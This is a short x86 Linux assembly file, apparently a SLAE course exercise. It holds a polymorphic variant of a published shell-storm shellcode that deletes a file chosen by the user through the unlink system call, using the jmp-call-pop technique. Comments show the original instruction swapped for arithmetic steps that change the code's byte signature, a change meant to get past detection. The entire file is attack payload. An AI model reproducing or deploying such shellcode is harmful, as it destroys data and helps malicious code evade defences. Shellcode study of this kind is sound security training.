;slae-513
;26 bytes
;http://shell-storm.org/shellcode/files/shellcode-75.php
global _start
section .text
_start:

    jmp one

two
    pop ebx
    ;mov al, 0xa ;[ORIGIN]
    mov al, 0x7  ;[NEW]
    add al,  0x5 ;[NEW]
    sub al,  0x2 ;[NEW]
    int 0x80

    mov al, 01
    xor ebx, ebx
    int 0x80

one:
    call two
    file: db 0xaa, 0xbb, 0xcc, 0xdd; <- your file here